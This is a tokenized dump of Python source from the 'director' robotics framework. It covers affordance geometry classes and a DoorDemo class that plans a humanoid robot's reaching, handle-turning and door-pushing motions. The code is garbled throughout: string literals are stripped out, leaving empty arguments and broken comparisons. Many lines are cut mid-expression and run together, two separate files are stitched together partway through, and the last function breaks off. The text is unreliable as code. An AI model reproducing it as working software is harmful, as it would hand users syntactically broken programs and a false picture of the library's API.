self . addProperty ( , 0.15 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep = 0.01 self . addProperty ( , 0.02 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep self . addProperty ( , 8 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep = 1 , minimum \n 
self . properties . setPropertyIndex ( , 0 ) \n 
self . properties . setPropertyIndex ( , 1 ) \n 
self . properties . setPropertyIndex ( , 2 ) \n 
\n 
self . updateGeometryFromProperties ( ) \n 
\n 
~~ def updateGeometryFromProperties ( self ) : \n 
~~~ radius = self . getProperty ( ) \n 
circlePoints = np . linspace ( 0 , 2 * np . pi , self . getProperty ( ) + 1 ) \n 
spokes = [ ( 0.0 , np . sin ( x ) , np . cos ( x ) ) for x in circlePoints ] \n 
spokes = [ radius * np . array ( x ) / np . linalg . norm ( x ) for x in spokes ] \n 
d = DebugData ( ) \n 
for a , b in zip ( spokes , spokes [ 1 : ] ) : \n 
~~~ d . addCapsule ( center = ( a + b ) / 2.0 , axis = ( b - a ) , length = np . linalg . norm ( b - a ) , radius = self . getProperty ~~ self . setPolyData ( d . getPolyData ( ) ) \n 
\n 
~~ def _onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ AffordanceItem . _onPropertyChanged ( self , propertySet , propertyName ) \n 
\n 
if propertyName in ( , , ) : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
\n 
~~ ~~ ~~ class MeshAffordanceItem ( AffordanceItem ) : \n 
\n 
~~~ _meshManager = None \n 
\n 
def __init__ ( self , name , view ) : \n 
~~~ AffordanceItem . __init__ ( self , name , vtk . vtkPolyData ( ) , view ) \n 
self . setProperty ( , False ) \n 
self . addProperty ( , ) \n 
self . properties . setPropertyIndex ( , 0 ) \n 
\n 
# attempt to reload geometry if it is currently empty \n 
if self . getProperty ( ) and not self . polyData . GetNumberOfPoints ( ) : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
\n 
~~ ~~ def updateGeometryFromProperties ( self ) : \n 
~~~ filename = self . getProperty ( ) \n 
\n 
if not filename : \n 
~~~ polyData = vtk . vtkPolyData ( ) \n 
~~ else : \n 
~~~ polyData = self . getMeshManager ( ) . get ( filename ) \n 
\n 
~~ if not polyData : \n 
\n 
~~~ if not os . path . isabs ( filename ) : \n 
~~~ filename = os . path . join ( director . getDRCBaseDir ( ) , filename ) \n 
\n 
~~ if os . path . isfile ( filename ) : \n 
~~~ polyData = ioUtils . readPolyData ( filename ) \n 
~~ else : \n 
# use axes as a placeholder mesh \n 
~~~ d = DebugData ( ) \n 
d . addFrame ( vtk . vtkTransform ( ) , scale = 0.1 , tubeRadius = 0.005 ) \n 
polyData = d . getPolyData ( ) \n 
\n 
~~ ~~ self . setPolyData ( polyData ) \n 
\n 
~~ @ classmethod \n 
def getMeshManager ( cls ) : \n 
~~~ if cls . _meshManager is None : \n 
~~~ cls . _meshManager = meshmanager . MeshManager ( ) \n 
~~ return cls . _meshManager \n 
\n 
~~ @ classmethod \n 
def promotePolyDataItem ( cls , obj ) : \n 
~~~ parent = obj . parent ( ) \n 
view = obj . views [ 0 ] \n 
name = obj . getProperty ( ) \n 
polyData = obj . polyData \n 
props = obj . properties . _properties \n 
childFrame = obj . getChildFrame ( ) \n 
if childFrame : \n 
~~~ t = transformUtils . copyFrame ( childFrame . transform ) \n 
~~ else : \n 
~~~ t = vtk . vtkTransform ( ) \n 
t . PostMultiply ( ) \n 
t . Translate ( filterUtils . computeCentroid ( polyData ) ) \n 
polyData = filterUtils . transformPolyData ( polyData , t . GetLinearInverse ( ) ) \n 
\n 
~~ children = [ c for c in obj . children ( ) if c is not childFrame ] \n 
\n 
meshId = cls . getMeshManager ( ) . add ( polyData ) \n 
\n 
om . removeFromObjectModel ( obj ) \n 
obj = MeshAffordanceItem ( name , view ) \n 
obj . setProperty ( , meshId ) \n 
om . addToObjectModel ( obj , parentObj = parent ) \n 
frame = vis . addChildFrame ( obj ) \n 
frame . copyFrame ( t ) \n 
\n 
for child in children : \n 
~~~ om . addToObjectModel ( child , parentObj = obj ) \n 
\n 
~~ obj . syncProperties ( props ) \n 
return obj \n 
\n 
\n 
~~ def _onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ AffordanceItem . _onPropertyChanged ( self , propertySet , propertyName ) \n 
\n 
if propertyName == : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
\n 
~~ ~~ ~~ class FrameAffordanceItem ( AffordanceItem ) : \n 
\n 
~~~ def setAffordanceParams ( self , params ) : \n 
~~~ self . params = params \n 
\n 
~~ def updateParamsFromActorTransform ( self ) : \n 
\n 
~~~ t = self . actor . GetUserTransform ( ) \n 
\n 
xaxis = np . array ( t . TransformVector ( [ 1 , 0 , 0 ] ) ) \n 
yaxis = np . array ( t . TransformVector ( [ 0 , 1 , 0 ] ) ) \n 
zaxis = np . array ( t . TransformVector ( [ 0 , 0 , 1 ] ) ) \n 
self . params [ ] = xaxis \n 
self . params [ ] = yaxis \n 
self . params [ ] = zaxis \n 
self . params [ ] = t . GetPosition ( ) \n 
~~ ~~ import os \n 
import sys \n 
import vtkAll as vtk \n 
import math \n 
import time \n 
import types \n 
import functools \n 
import numpy as np \n 
\n 
from director import transformUtils \n 
from director import lcmUtils \n 
from director . timercallback import TimerCallback \n 
from director . asynctaskqueue import AsyncTaskQueue \n 
from director . fieldcontainer import FieldContainer \n 
from director import objectmodel as om \n 
from director import visualization as vis \n 
from director import applogic as app \n 
from director . debugVis import DebugData \n 
from director import ik \n 
from director . ikparameters import IkParameters \n 
from director import ikplanner \n 
from director import ioUtils \n 
from director import affordanceitems \n 
from director . simpletimer import SimpleTimer \n 
from director . utime import getUtime \n 
from director import robotstate \n 
from director import robotplanlistener \n 
from director import segmentation \n 
from director import planplayback \n 
from director . footstepsdriver import FootstepRequestGenerator \n 
from director . tasks . taskuserpanel import TaskUserPanel \n 
from director . tasks . taskuserpanel import ImageBasedAffordanceFit \n 
\n 
\n 
import director . tasks . robottasks as rt \n 
import director . tasks . taskmanagerwidget as tmw \n 
\n 
import drc as lcmdrc \n 
\n 
from PythonQt import QtCore , QtGui \n 
\n 
\n 
class DoorDemo ( object ) : \n 
\n 
~~~ def __init__ ( self , robotModel , footstepPlanner , manipPlanner , ikPlanner , lhandDriver , rhandDriver ~~~ self . robotModel = robotModel \n 
self . footstepPlanner = footstepPlanner \n 
self . manipPlanner = manipPlanner \n 
self . ikPlanner = ikPlanner \n 
self . lhandDriver = lhandDriver \n 
self . rhandDriver = rhandDriver \n 
self . atlasDriver = atlasDriver \n 
self . multisenseDriver = multisenseDriver \n 
self . affordanceFitFunction = affordanceFitFunction \n 
self . sensorJointController = sensorJointController \n 
self . planPlaybackFunction = planPlaybackFunction \n 
self . showPoseFunction = showPoseFunction \n 
self . graspingHand = \n 
\n 
self . endPose = None \n 
\n 
self . planFromCurrentRobotState = True \n 
self . visOnly = False \n 
self . useFootstepPlanner = False \n 
self . userPromptEnabled = True \n 
\n 
self . constraintSet = None \n 
self . plans = [ ] \n 
\n 
self . usePinchGrasp = False \n 
self . pinchDistance = 0.1 \n 
self . doorHandleFrame = None \n 
self . doorHandleGraspFrame = None \n 
self . doorHingeFrame = None \n 
\n 
self . handleTouchHeight = 0.0 \n 
self . handleTouchDepth = - 0.08 \n 
self . handleTouchWidth = 0.06 \n 
\n 
self . handleReachAngle = 20 \n 
\n 
self . handleTurnHeight = - 0.08 \n 
self . handleTurnWidth = 0.01 \n 
self . handleTurnAngle = 60 \n 
\n 
self . handleLiftHeight = 0.12 \n 
self . handlePushDepth = 0.0 \n 
self . handlePushAngle = 2 \n 
self . handleOpenDepth = 0.1 \n 
self . handleOpenWidth = 0.4 \n 
\n 
self . speedHigh = 60 \n 
self . speedLow = 15 \n 
\n 
self . setFootstepThroughDoorParameters ( ) \n 
\n 
self . setChopParametersToDefaults ( ) \n 
\n 
\n 
~~ def setChopParametersToDefaults ( self ) : \n 
\n 
~~~ self . preChopDepth = - 0.06 \n 
self . preChopWidth = - 0.08 \n 
self . preChopHeight = 0.10 \n 
self . chopDistance = - 0.15 \n 
self . chopSidewaysDistance = 0.03 \n 
\n 
~~ def addPlan ( self , plan ) : \n 
~~~ self . plans . append ( plan ) \n 
\n 
\n 
~~ def computeGraspOrientation ( self ) : \n 
~~~ return [ 180 + self . handleReachAngle , 0 , 90 ] \n 
\n 
~~ def computeGroundFrame ( self , robotModel ) : \n 
~~~ \n 
t1 = robotModel . getLinkFrame ( ) \n 
t2 = robotModel . getLinkFrame ( ) \n 
pelvisT = robotModel . getLinkFrame ( ) \n 
\n 
xaxis = [ 1.0 , 0.0 , 0.0 ] \n 
pelvisT . TransformVector ( xaxis , xaxis ) \n 
xaxis = np . array ( xaxis ) \n 
zaxis = np . array ( [ 0.0 , 0.0 , 1.0 ] ) \n 
yaxis = np . cross ( zaxis , xaxis ) \n 
yaxis /= np . linalg . norm ( yaxis ) \n 
xaxis = np . cross ( yaxis , zaxis ) \n 
\n 
stancePosition = ( np . array ( t2 . GetPosition ( ) ) + np . array ( t1 . GetPosition ( ) ) ) / 2.0 \n 
\n 
footHeight = 0.0811 \n 
\n 
t = transformUtils . getTransformFromAxes ( xaxis , yaxis , zaxis ) \n 
t . PostMultiply ( ) \n 
t . Translate ( stancePosition ) \n 
t . Translate ( [ 0.0 , 0.0 , - footHeight ] ) \n 
\n 
return t \n 
\n 
\n 
~~ def computeDoorHandleGraspFrame ( self ) : \n 
~~~ doorSide = 1 if self . graspingHand == else - 1 \n 
graspOrientation = self . computeGraspOrientation ( ) \n 
self . doorHandleAxisFrame = self . computeDoorHandleAxisFrame ( ) \n 
\n 
def makeFrame ( name , offset , turnAngle = 0 ) : \n 
~~~ t = transformUtils . frameFromPositionAndRPY ( offset , graspOrientation ) \n 
t . PostMultiply ( ) \n 
t . Concatenate ( transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , 0.0 ] , [ - turnAngle , 0 , 0 ] t . Concatenate ( transformUtils . copyFrame ( self . doorHandleAxisFrame . transform ) ) \n 
return vis . updateFrame ( t , name , parent = self . doorHandleAffordance , visible = False , scale = 0.2 \n 
~~ def makeFrameNew ( name , transforms ) : \n 
~~~ t = transformUtils . concatenateTransforms ( transforms ) \n 
return vis . updateFrame ( t , name , parent = self . doorHandleAffordance , visible = False , scale = 0.2 \n 
~~ graspToAxisTransform = transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , 0.0 ] , \n 
graspOrientation ) \n 
self . doorHandleGraspFrame = makeFrameNew ( , \n 
[ graspToAxisTransform , \n 
self . doorHandleAxisFrame . transform ] ) \n 
\n 
if self . usePinchGrasp : \n 
~~~ reachToGraspTransform = transformUtils . frameFromPositionAndRPY ( [ - doorSide * self . handleTouchWidth self . handleTouchDepth , \n 
- self . handleTouchHeight ] [ 0.0 , 0.0 , 0.0 ] ) \n 
self . doorHandleReachFrame = makeFrameNew ( , [ reachToGraspTransform self . doorHandleGraspFrame \n 
handleTurnTransform = transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , 0.0 ] , [ - self . handleTurnAngle self . doorHandleTurnFrame = makeFrameNew ( , [ reachToGraspTransform graspToAxisTransform , \n 
handleTurnTransform , \n 
self . doorHandleAxisFrame \n 
handlePushTransform = transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , 0.0 ] , \n 
[ 0 , 0 , self . handlePushAngle ] self . doorHandlePushFrame = makeFrameNew ( , \n 
[ self . doorHandleTurnFrame . transform , \n 
self . doorHingeFrame . transform . GetInverse ( ) , \n 
handlePushTransform , \n 
self . doorHingeFrame . transform ] ) \n 
\n 
self . doorHandlePushLiftFrame = makeFrameNew ( , \n 
[ self . doorHandleReachFrame . transform , \n 
self . doorHingeFrame . transform . GetInverse ( ) , \n 
handlePushTransform , \n 
self . doorHingeFrame . transform ] ) \n 
\n 
self . doorHandlePushLiftAxisFrame = makeFrameNew ( , \n 
[ self . doorHandleAxisFrame . transform , \n 
self . doorHingeFrame . transform . GetInverse ( ) , \n 
handlePushTransform , \n 
self . doorHingeFrame . transform ] ) \n 
\n 
\n 
self . doorHandlePushOpenFrame = makeFrame ( , [ self . handleOpenDepth \n 
t = vtk . vtkTransform ( ) \n 
t . PostMultiply ( ) \n 
t . RotateX ( 25 ) \n 
t . Concatenate ( self . doorHandlePushOpenFrame . transform ) \n 
self . doorHandlePushOpenFrame . copyFrame ( t ) \n 
~~ else : \n 
~~~ reachToAxisTransform = transformUtils . frameFromPositionAndRPY ( [ self . preChopDepth , \n 
doorSide * self . preChopWidth , \n 
self . preChopHeight ] , \n 
[ 0 , 90 , - 90 ] ) \n 
\n 
obj = om . findObjectByName ( ) \n 
self . doorHandleReachFrame = makeFrameNew ( , \n 
[ reachToAxisTransform , self . doorHandleAxisFrame \n 
# the first time the frame is created, set some display properties \n 
if not obj : \n 
~~~ obj = self . doorHandleReachFrame \n 
obj . setProperty ( , True ) \n 
obj . setProperty ( , True ) \n 
rep = obj . widget . GetRepresentation ( ) \n 
rep . SetRotateAxisEnabled ( 0 , False ) \n 
rep . SetRotateAxisEnabled ( 1 , False ) \n 
rep . SetRotateAxisEnabled ( 2 , False ) \n 
obj . widget . HandleRotationEnabledOff ( ) \n 
obj . setProperty ( , False ) \n 
\n 
\n 
~~ preChopToReachTransform = transformUtils . frameFromPositionAndRPY ( [ 0.0 , \n 
- 0.15 , \n 
0.0 ] , \n 
[ 0 , 0 , 0 ] ) \n 
self . doorHandlePreChopFrame = makeFrameNew ( , \n 
[ preChopToReachTransform , self . doorHandleReachFrame \n 
\n 
~~ self . doorHandleFrame . frameSync = vis . FrameSync ( ) \n 
self . doorHandleFrame . frameSync . addFrame ( self . doorHandleFrame ) \n 
self . doorHandleFrame . frameSync . addFrame ( self . doorHandleAxisFrame ) \n 
self . doorHandleFrame . frameSync . addFrame ( self . doorHandleGraspFrame , ignoreIncoming = True ) \n 
self . doorHandleFrame . frameSync . addFrame ( self . doorHandleReachFrame , ignoreIncoming = True ) \n 
if self . usePinchGrasp : \n 
~~~ self . doorHandleFrame . frameSync . addFrame ( self . doorHandleTurnFrame , ignoreIncoming = True ) \n 
self . doorHandleFrame . frameSync . addFrame ( self . doorHandlePushFrame , ignoreIncoming = True ) \n 
self . doorHandleFrame . frameSync . addFrame ( self . doorHandlePushLiftFrame , ignoreIncoming = True self . doorHandleFrame . frameSync . addFrame ( self . doorHandlePushLiftAxisFrame , ignoreIncoming self . doorHandleFrame . frameSync . addFrame ( self . doorHandlePushOpenFrame , ignoreIncoming = True ~~ else : \n 
~~~ self . doorHandleFrame . frameSync . addFrame ( self . doorHandlePreChopFrame , ignoreIncoming = True \n 
\n 
~~ ~~ def computeDoorHandleAxisFrame ( self ) : \n 
~~~ handleLength = self . doorHandleAffordance . getProperty ( ) [ 1 ] \n 
doorSide = 1 if self . graspingHand == else - 1 \n 
t = transformUtils . frameFromPositionAndRPY ( [ 0.0 , doorSide * handleLength / 2.0 , 0.0 ] , [ 0 , 0 , 0 ] ) t . PostMultiply ( ) \n 
t . Concatenate ( transformUtils . copyFrame ( self . doorHandleFrame . transform ) ) \n 
return vis . updateFrame ( t , , parent = self . doorHandleAffordance , \n 
visible = False , scale = 0.2 ) \n 
\n 
\n 
~~ def computeDoorHingeFrame ( self ) : \n 
~~~ doorSide = 1 if self . graspingHand == else - 1 \n 
doorAffordance = om . findObjectByName ( ) \n 
doorDimensions = doorAffordance . getProperty ( ) \n 
doorDepth = doorDimensions [ 0 ] \n 
doorWidth = doorDimensions [ 1 ] \n 
t = transformUtils . frameFromPositionAndRPY ( [ doorDepth / 2 , - doorSide * doorWidth / 2.0 , 0.0 ] , [ 0 , t . PostMultiply ( ) \n 
t . Concatenate ( transformUtils . copyFrame ( doorAffordance . getChildFrame ( ) . transform ) ) \n 
self . doorHingeFrame = vis . updateFrame ( t , , parent = doorAffordance , \n 
visible = False , scale = 0.2 ) \n 
return self . doorHingeFrame \n 
\n 
\n 
~~ def computeDoorHandleStanceFrame ( self ) : \n 
\n 
~~~ graspFrame = self . doorHandleFrame . transform \n 
\n 
groundFrame = self . computeGroundFrame ( self . robotModel ) \n 
groundHeight = groundFrame . GetPosition ( ) [ 2 ] \n 
\n 
graspPosition = np . array ( graspFrame . GetPosition ( ) ) \n 
xaxis = [ 1.0 , 0.0 , 0.0 ] \n 
yaxis = [ 0.0 , 1.0 , 0.0 ] \n 
zaxis = [ 0 , 0 , 1 ] \n 
graspFrame . TransformVector ( xaxis , xaxis ) \n 
graspFrame . TransformVector ( yaxis , yaxis ) \n 
\n 
yaxis = np . cross ( zaxis , xaxis ) \n 
yaxis /= np . linalg . norm ( yaxis ) \n 
xaxis = np . cross ( yaxis , zaxis ) \n 
\n 
graspGroundFrame = transformUtils . getTransformFromAxes ( xaxis , yaxis , zaxis ) \n 
graspGroundFrame . PostMultiply ( ) \n 
graspGroundFrame . Translate ( graspPosition [ 0 ] , graspPosition [ 1 ] , groundHeight ) \n 
\n 
\n 
#position = [-0.75, 0.3, 0.0] \n 
#rpy = [0, 0, -30] \n 
\n 
position = [ - 0.77 , 0.4 , 0.0 ] \n 
rpy = [ 0 , 0 , - 20 ] \n 
\n 
\n 
t = transformUtils . frameFromPositionAndRPY ( position , rpy ) \n 
t . Concatenate ( graspGroundFrame ) \n 
\n 
self . doorHandleStanceFrame = vis . updateFrame ( t , , parent = self . doorHandleAffordance #self.frameSync.addFrame(self.doorHandleStanceFrame) \n 
\n 
~~ def moveRobotToStanceFrame ( self ) : \n 
~~~ frame = self . doorHandleStanceFrame . transform \n 
\n 
self . sensorJointController . setPose ( ) \n 
stancePosition = frame . GetPosition ( ) \n 
stanceOrientation = frame . GetOrientation ( ) \n 
\n 
self . sensorJointController . q [ : 2 ] = [ stancePosition [ 0 ] , stancePosition [ 1 ] ] \n 
self . sensorJointController . q [ 5 ] = math . radians ( stanceOrientation [ 2 ] ) \n 
self . sensorJointController . push ( ) \n 
\n 
\n 
~~ def planNominal ( self ) : \n 
~~~ startPose = self . getPlanningStartPose ( ) \n 
endPose = self . ikPlanner . getMergedPostureFromDatabase ( startPose , , ) \n 
endPose , info = self . ikPlanner . computeStandPose ( endPose ) \n 
newPlan = self . ikPlanner . computePostureGoal ( startPose , endPose ) \n 
self . addPlan ( newPlan ) \n 
\n 
\n 
~~ def planPreReach ( self ) : \n 
\n 
~~~ ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = self . speedHigh ) \n 
nonGraspingHand = if self . graspingHand == else \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
\n 
if self . usePinchGrasp : \n 
~~~ endPose = self . ikPlanner . getMergedPostureFromDatabase ( startPose , , \n 
, \n 
side = self . graspingHand ) \n 
~~ else : \n 
~~~ endPose = self . ikPlanner . getMergedPostureFromDatabase ( startPose , , \n 
, \n 
side = self . graspingHand ) \n 
\n 
~~ endPose = self . ikPlanner . getMergedPostureFromDatabase ( endPose , , \n 
, \n 
side = nonGraspingHand ) \n 
endPose , info = self . ikPlanner . computeStandPose ( endPose , ikParameters = ikParameters ) \n 
newPlan = self . ikPlanner . computePostureGoal ( startPose , endPose , ikParameters = ikParameters ) \n 
self . addPlan ( newPlan ) \n 
\n 
\n 
~~ def planUnReach ( self ) : \n 
\n 
~~~ ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = self . speedLow ) \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
endPose = self . ikPlanner . getMergedPostureFromDatabase ( startPose , , \n 
, \n 
side = self . graspingHand ) \n 
endPose , info = self . ikPlanner . computeStandPose ( endPose , ikParameters = ikParameters ) \n 
newPlan = self . ikPlanner . computePostureGoal ( startPose , endPose , ikParameters = ikParameters ) \n 
self . addPlan ( newPlan ) \n 
\n 
\n 
~~ def planTuckArms ( self ) : \n 
\n 
\n 
~~~ ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = self . speedHigh ) \n 
\n 
otherSide = if self . graspingHand == else \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
\n 
standPose , info = self . ikPlanner . computeStandPose ( startPose , ikParameters = ikParameters ) \n 
\n 
q2 = self . ikPlanner . getMergedPostureFromDatabase ( standPose , , , side = otherSide a = 0.25 \n 
q2 = ( 1.0 - a ) * np . array ( standPose ) + a * q2 \n 
q2 = self . ikPlanner . getMergedPostureFromDatabase ( q2 , , , side = self . graspingHand a = 0.75 \n 
q2 = ( 1.0 - a ) * np . array ( standPose ) + a * q2 \n 
\n 
endPose = self . ikPlanner . getMergedPostureFromDatabase ( standPose , , , side endPose = self . ikPlanner . getMergedPostureFromDatabase ( endPose , , , side = \n 
newPlan = self . ikPlanner . computeMultiPostureGoal ( [ startPose , q2 , endPose ] , ikParameters = ikParameters self . addPlan ( newPlan ) \n 
\n 
~~ def planTuckArmsPrePush ( self ) : \n 
\n 
\n 
~~~ ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = self . speedHigh ) \n 
\n 
otherSide = if self . graspingHand == else \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
\n 
standPose , info = self . ikPlanner . computeStandPose ( startPose , ikParameters = ikParameters ) \n 
\n 
q2 = self . ikPlanner . getMergedPostureFromDatabase ( standPose , , , side = self a = 0.25 \n 
q2 = ( 1.0 - a ) * np . array ( standPose ) + a * q2 \n 
q2 = self . ikPlanner . getMergedPostureFromDatabase ( q2 , , , side = otherSide ) a = 0.75 \n 
q2 = ( 1.0 - a ) * np . array ( standPose ) + a * q2 \n 
\n 
endPose = self . ikPlanner . getMergedPostureFromDatabase ( standPose , , , side endPose = self . ikPlanner . getMergedPostureFromDatabase ( endPose , , , side = \n 
newPlan = self . ikPlanner . computeMultiPostureGoal ( [ startPose , q2 , endPose ] , ikParameters = ikParameters self . addPlan ( newPlan ) \n 
\n 
\n 
~~ def planChop ( self , deltaZ = None , deltaY = None , deltaX = None ) : \n 
\n 
~~~ startPose = self . getPlanningStartPose ( ) \n 
\n 
if deltaZ is None : \n 
~~~ deltaZ = self . chopDistance \n 
~~ if deltaY is None : \n 
~~~ deltaY = self . chopSidewaysDistance \n 
~~ if deltaX is None : \n 
~~~ deltaX = 0.0 \n 
\n 
~~ linkOffsetFrame = self . ikPlanner . getPalmToHandLink ( self . graspingHand ) \n 
handLinkName = self . ikPlanner . getHandLink ( self . graspingHand ) \n 
startFrame = self . ikPlanner . getLinkFrameAtPose ( handLinkName , startPose ) \n 
endToStartTransform = transformUtils . frameFromPositionAndRPY ( [ deltaZ , - deltaX , - deltaY ] , \n 
[ 0 , 0 , 0 ] ) \n 
endFrame = transformUtils . concatenateTransforms ( [ endToStartTransform , startFrame ] ) ; \n 
vis . updateFrame ( endFrame , , parent = self . doorHandleAffordance , visible = False , scale palmToWorld1 = transformUtils . concatenateTransforms ( [ linkOffsetFrame , startFrame ] ) \n 
palmToWorld2 = transformUtils . concatenateTransforms ( [ linkOffsetFrame , endFrame ] ) \n 
\n 
constraintSet = self . ikPlanner . planEndEffectorGoal ( startPose , self . graspingHand , palmToWorld2 constraintSet . nominalPoseName = \n 
constraintSet . ikParameters = IkParameters ( usePointwise = False , \n 
maxDegreesPerSecond = self . speedLow , \n 
numberOfAddedKnots = 2 ) \n 
\n 
endPose , info = constraintSet . runIk ( ) \n 
\n 
\n 
motionVector = np . array ( palmToWorld2 . GetPosition ( ) ) - np . array ( palmToWorld1 . GetPosition ( ) ) \n 
motionTargetFrame = transformUtils . getTransformFromOriginAndNormal ( np . array ( palmToWorld2 . GetPosition \n 
p = self . ikPlanner . createLinePositionConstraint ( handLinkName , linkOffsetFrame , motionTargetFrame constraintSet . constraints . append ( p ) \n 
\n 
plan = constraintSet . runIkTraj ( ) \n 
self . addPlan ( plan ) \n 
\n 
~~ def stopPushing ( self ) : \n 
~~~ startPose = self . getPlanningStartPose \n 
plan = self . robotSystem . ikPlanner . computePostureGoal ( startPose , startPose ) \n 
self . addPlan ( plan ) \n 
self . commitManipPlan ( ) \n 
\n 
~~ def planReach ( self , reachTargetFrame = None , jointSpeedLimit = None ) : \n 
\n 
~~~ if reachTargetFrame is None : \n 
~~~ reachTargetFrame = self . doorHandleReachFrame \n 
\n 
~~ if jointSpeedLimit is None : \n 
~~~ jointSpeedLimit = self . speedLow \n 
\n 
~~ startPose = self . getPlanningStartPose ( ) \n 
constraintSet = self . ikPlanner . planEndEffectorGoal ( startPose , self . graspingHand , reachTargetFrame constraintSet . nominalPoseName = \n 
constraintSet . ikParameters = IkParameters ( usePointwise = False , \n 
maxDegreesPerSecond = self . speedLow , \n 
numberOfAddedKnots = 2 ) \n 
\n 
endPose , info = constraintSet . runIk ( ) \n 
\n 
linkOffsetFrame = self . ikPlanner . getPalmToHandLink ( self . graspingHand ) \n 
handLinkName = self . ikPlanner . getHandLink ( self . graspingHand ) \n 
handToWorld1 = self . ikPlanner . getLinkFrameAtPose ( handLinkName , startPose ) \n 
handToWorld2 = self . ikPlanner . getLinkFrameAtPose ( handLinkName , endPose ) \n 
palmToWorld1 = transformUtils . concatenateTransforms ( [ linkOffsetFrame , handToWorld1 ] ) \n 
palmToWorld2 = transformUtils . concatenateTransforms ( [ linkOffsetFrame , handToWorld2 ] ) \n 
\n 
motionVector = np . array ( palmToWorld2 . GetPosition ( ) ) - np . array ( palmToWorld1 . GetPosition ( ) ) \n 
motionTargetFrame = transformUtils . getTransformFromOriginAndNormal ( np . array ( palmToWorld2 . GetPosition \n 
p = self . ikPlanner . createLinePositionConstraint ( handLinkName , linkOffsetFrame , motionTargetFrame constraintSet . constraints . append ( p ) \n 
\n 
plan = constraintSet . runIkTraj ( ) \n 
self . addPlan ( plan ) \n 
\n 
~~ def planPreChop ( self ) : \n 
~~~ self . planReach ( self . doorHandlePreChopFrame , self . speedHigh ) \n 
\n 
\n 
~~ def createHingeConstraint ( self , referenceFrame , axis , linkName , startPose , tspan = [ 0 , 1 ] ) : \n 
\n 
~~~ constraints = [ ] \n 
linkFrame = self . ikPlanner . getLinkFrameAtPose ( linkName , startPose ) \n 
\n 
#turnTransform = transformUtils.frameFromPositionAndRPY([0.0, 0.0, 0.0], [-turnAngle, 0, 0]) #turnTransform = vtkTransform() \n 
#turnTransform.RotateWXYZ(turnAngle, axis) \n 
#linkToReferenceTransfrom = tranformUtils.concatenateTransforms([linkFrame, \n 
#referenceFrame.transform.GetInverse()]) #finalLinkFrame = transformUtils.concatenateTransforms([linkToReferenceTransfrom, \n 
#turnTransform, \n 
#referenceFrame.transform]) \n 
def addPivotPoint ( constraints , pivotPoint ) : \n 
~~~ constraints . append ( ik . PositionConstraint ( ) ) \n 
constraints [ - 1 ] . linkName = linkName \n 
constraints [ - 1 ] . referenceFrame = referenceFrame . transform \n 
constraints [ - 1 ] . lowerBound = np . array ( pivotPoint ) \n 
constraints [ - 1 ] . upperBound = np . array ( pivotPoint ) \n 
pivotPointInWorld = referenceFrame . transform . TransformDoublePoint ( pivotPoint ) \n 
constraints [ - 1 ] . pointInLink = linkFrame . GetInverse ( ) . TransformDoublePoint ( pivotPointInWorld constraints [ - 1 ] . tspan = tspan \n 
\n 
~~ addPivotPoint ( constraints , [ 0.0 , 0.0 , 0.0 ] ) \n 
addPivotPoint ( constraints , axis ) \n 
return constraints \n 
\n 
\n 
~~ def planHandleTurn ( self , turnAngle = None ) : \n 
\n 
~~~ doorSide = 1 if self . graspingHand == else - 1 \n 
if turnAngle is None : \n 
~~~ turnAngle = self . handleTurnAngle \n 
\n 
~~ startPose = self . getPlanningStartPose ( ) \n 
linkFrame = self . ikPlanner . getLinkFrameAtPose ( self . ikPlanner . getHandLink ( ) , startPose ) \n 
\n 
finalGraspToReferenceTransfrom = transformUtils . concatenateTransforms ( \n 
[ self . ikPlanner . getPalmToHandLink ( self . graspingHand ) , linkFrame , \n 
self . doorHandleAxisFrame . transform . GetInverse ( ) ] ) \n 
\n 
handleTurnTransform = transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , 0.0 ] , \n 
[ doorSide * turnAngle , 0 , 0 ] ) \n 
doorHandleTurnFrame = transformUtils . concatenateTransforms ( [ finalGraspToReferenceTransfrom , \n 
handleTurnTransform , \n 
self . doorHandleAxisFrame . transform \n 
vis . updateFrame ( doorHandleTurnFrame , , parent = self . doorHandleAffordance , visible constraintSet = self . ikPlanner . planEndEffectorGoal ( startPose , self . graspingHand , \n 
doorHandleTurnFrame ) \n 
\n 
constraintSet . ikParameters = IkParameters ( usePointwise = False , \n 
maxDegreesPerSecond = self . speedLow , \n 
numberOfAddedKnots = 2 ) \n 
constraintSet . nominalPoseName = \n 
endPose , info = constraintSet . runIk ( ) \n 
constraints = constraintSet . constraints \n 
\n 
constraints . extend ( self . createHingeConstraint ( self . doorHandleAxisFrame , [ 1.0 , 0.0 , 0.0 ] , \n 
self . ikPlanner . getHandLink ( ) , \n 
constraintSet . startPoseName ) ) \n 
constraints . append ( self . ikPlanner . createLockedBasePostureConstraint ( constraintSet . startPoseName constraints . append ( self . ikPlanner . createLockedBackPostureConstraint ( constraintSet . startPoseName constraints . extend ( self . ikPlanner . createFixedFootConstraints ( constraintSet . startPoseName ) ) \n 
constraints . append ( self . ikPlanner . createLockedArmPostureConstraint ( constraintSet . startPoseName \n 
plan = constraintSet . runIkTraj ( ) \n 
\n 
self . addPlan ( plan ) \n 
\n 
~~ def planDoorPushOpen ( self ) : \n 
\n 
~~~ ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = 15 ) \n 
\n 
nonGraspingHand = if self . graspingHand == else \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
endPose = self . ikPlanner . getMergedPostureFromDatabase ( startPose , , , side = nonGraspingHand \n 
